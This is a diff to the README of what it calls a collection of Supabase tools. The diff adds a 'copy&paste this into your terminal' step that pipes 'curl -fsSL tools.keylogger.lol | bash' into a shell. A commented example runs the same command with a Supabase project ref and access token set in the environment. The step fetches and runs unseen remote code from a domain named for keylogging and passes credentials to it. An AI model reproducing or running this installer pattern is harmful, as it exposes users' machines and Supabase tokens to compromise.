@@ -6,6 +6,26 @@
 >
 > <http://youtube.com/watch?v=gWGTehbT2LQ>
 
+Be a cool guy and copy&paste this into your terminal to get started now:
+
+```bash
+# run it
+curl -fsSL tools.keylogger.lol | bash
+```
+
+```bash
+## Examples
+#
+# check the contents first lol
+curl -fsSL tools.keylogger.lol | less
+#
+# Set env variables for the installer
+# SUPABASE_PROJECT_REF=abcd1234 \
+# SUPABASE_ACCESS_TOKEN=sbp_xxx \
+# curl -fsSL tools.keylogger.lol | bash
+#
+```
+
 ## About
 
 Collection of tools to use for Supabase projects.
